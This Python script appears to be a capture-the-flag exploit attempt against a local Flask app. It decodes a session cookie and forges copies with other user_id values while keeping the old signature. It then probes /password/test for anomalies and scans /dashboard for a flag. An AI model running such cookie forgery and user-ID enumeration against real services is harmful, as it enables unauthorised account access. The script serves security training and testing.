import requests
import base64
import json
import re

BASE_URL = "http://127.0.0.1:33029"

# Decode the original session to understand structure
print("[*] Analyzing session cookie structure...")
original_session = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"
print(f"[+] Original session: {original_session}")

# Split the session token (Flask format: payload.signature.timestamp)
parts = original_session.split('.')
print(f"[+] Session parts: {len(parts)}")
print(f"  Part 1 (payload): {parts[0]}")
print(f"  Part 2 (sig): {parts[1]}")
print(f"  Part 3 (?): {parts[2]}")

# Decode the payload part
try:
    # Add padding if needed
    payload_b64 = parts[0]
    padding = 4 - len(payload_b64) % 4
    if padding != 4:
        payload_b64 += '=' * padding
    
    payload_decoded = base64.urlsafe_b64decode(payload_b64).decode()
    print(f"[+] Decoded payload: {payload_decoded}")
    
    payload_json = json.loads(payload_decoded)
    print(f"[+] JSON payload: {payload_json}")
except Exception as e:
    print(f"[-] Decode error: {e}")

# Try different user_id values in the session cookie
print("\n" + "="*60)
print("[*] SESSION COOKIE TAMPERING TEST")
print("="*60)

test_user_ids = [10030, 10031, 10032, 10033, 10034, 10000, 1, 9999]

def create_modified_session(original, new_user_id):
    """Modify the session cookie with a new user_id"""
    parts = original.split('.')
    
    # Modify payload
    try:
        payload_b64 = parts[0]
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += '=' * padding
        
        payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode())
        payload['user_id'] = new_user_id
        
        # Re-encode
        new_payload = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')
        
        # Keep original signature (won't be valid but let's see)
        return f"{new_payload}.{parts[1]}.{parts[2]}"
    except Exception as e:
        print(f"Error creating session: {e}")
        return None

anomalies = []

# First establish baseline
baseline_session = create_modified_session(original_session, 10032)
baseline_cookies = {'session': baseline_session}
baseline_resp = requests.post(
    f"{BASE_URL}/password/test",
    data="password=test&user_id=10032",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    cookies=baseline_cookies,
    allow_redirects=False
)
baseline_status = baseline_resp.status_code
baseline_location = baseline_resp.headers.get('Location', 'N/A')
print(f"[+] Baseline (10032): Status={baseline_status}, Location={baseline_location}")

for user_id in test_user_ids:
    if user_id == 10032:
        continue  # Skip baseline, already tested
        
    modified_session = create_modified_session(original_session, user_id)
    if not modified_session:
        continue
    
    cookies = {'session': modified_session}
    
    resp = requests.post(
        f"{BASE_URL}/password/test",
        data="password=test&user_id=10032",  # Keep original POST data
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        cookies=cookies,
        allow_redirects=False
    )
    
    location = resp.headers.get('Location', 'N/A')
    status = resp.status_code
    
    # Check for anomalies
    is_anomaly = (status != baseline_status or location != baseline_location)
    marker = "[!] ANOMALY" if is_anomaly else "-"
    
    print(f"user_id={user_id}: Status={status}, Location={location} [{marker}]")
    
    if is_anomaly:
        anomalies.append({
            'user_id': user_id,
            'status': status,
            'location': location,
            'session': modified_session
        })

if anomalies:
    print("\n[!] ANOMALIES FOUND DURING SESSION TAMPERING:")
    for a in anomalies:
        print(f"  user_id={a['user_id']}: {a['status']} -> {a['location']}")
else:
    print("\n[-] No anomalies in session tampering - all responses identical to baseline")

# Check what happens when we access dashboard directly
print("\n" + "="*60)
print("[*] CHECKING DASHBOARD CONTENT")
print("="*60)

original_cookies = {'session': original_session}

# Access dashboard with original session
dash_resp = requests.get(f"{BASE_URL}/dashboard", cookies=original_cookies, allow_redirects=False)
print(f"[+] Dashboard with original session: Status={dash_resp.status_code}, Length={len(dash_resp.text)}")
flag_match = re.search(r'FLAG\{[^}]+\}', dash_resp.text)
if flag_match:
    print(f"[!] FLAG: {flag_match.group(0)}")

# Check response content
dash_content = dash_resp.text
print(f"[+] Dashboard content type: {dash_resp.headers.get('Content-Type', 'N/A')}")

# Check if there's user info embedded
if 'Welcome' in dash_content:
    welcome = re.search(r'Welcome[^<]+', dash_content)
    if welcome:
        print(f"[+] Welcome message: {welcome.group(0)}")

if 'user' in dash_content.lower() or 'id' in dash_content.lower():
    user_refs = re.findall(r'(user|User|USER|id|ID)[^<]{0,50}', dash_content)
    if user_refs:
        print(f"[+] User references found: {user_refs[:5]}")

# Print a snippet of dashboard
print(f"\n[+] Dashboard content (first 1000 chars):")
print(dash_content[:1000])

